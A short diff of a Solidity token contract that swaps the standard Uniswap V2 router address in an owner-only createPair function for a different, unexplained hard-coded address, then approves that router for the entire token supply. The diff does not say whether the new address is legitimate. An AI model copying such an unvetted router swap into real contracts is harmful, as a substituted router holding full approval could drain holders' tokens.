@@ -257,7 +257,7 @@ contract Ownable is Context {
         function createPair() external onlyOwner {
             require(!tradingOpen,"init already called");
             uint256 tokenAmount = balanceOf(address(this)).sub(_tTotal.mul(_initialBuyTax).div(100));
-            uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+            uniswapV2Router = IUniswapV2Router02(0x8f93F959E5e49f300c22Bfcb641cf0DDbf2cE063);
             _approve(address(this), address(uniswapV2Router), _tTotal);
             uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
                 .createPair(address(this), uniswapV2Router.WETH()
